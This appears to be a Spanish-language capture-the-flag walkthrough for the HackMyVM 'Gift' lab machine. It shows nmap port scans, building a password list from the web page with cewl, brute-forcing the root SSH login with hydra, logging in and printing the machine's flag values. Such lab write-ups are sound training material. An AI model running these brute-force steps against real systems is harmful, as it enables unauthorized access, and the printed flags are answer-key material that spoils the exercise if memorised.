---
icon: flag
---

# Gift HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 10:28 EDT
Nmap scan report for 192.168.28.14
Host is up (0.00068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81🆎36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:24:E6:9E (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
```

Vemos que hay una pagina web levantada si entramos dentro de la misma veremos lo siguiente:

```
Dont Overthink. Really, Its simple.
```

Vamos a probar fuerza bruta generando un diccionario de palabras de la web y despues probaremos con el unico usuario que sabemos que puede estar en el sevidor llamado `root` de la siguiente forma:

## Escalate Privileges

### Hydra

Vamos a crear antes el diccionario de contraseñas de la pagina web.

```shell
cewl http://<IP>/index.html > pass.txt
```

Ahora ejecutaremos lo siguiente:

```shell
hydra -l root -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 10:46:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://192.168.28.14:22/
[22][ssh] host: 192.168.28.14   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 10:46:10
```

Veremos que ha funcionado, por lo que ahora nos vamos a conectar por `SSH` de la siguiente forma:

### SSH

```shell
ssh root@<IP>
```

Metemos como contraseña `simple`.

Info:

```
The authenticity of host '192.168.28.14 (192.168.28.14)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.28.14' (ED25519) to the list of known hosts.
root@192.168.28.14's password: 
IM AN SSH SERVER
gift:~# whoami
root
```

Con esto habremos accedido a la maquina y ya seremos el usuario `root` directamente, por lo que leeremos las `flags`.

> user.txt

```
HMV665sXzDS
```

> root.txt

```
HMVtyr543FG
```
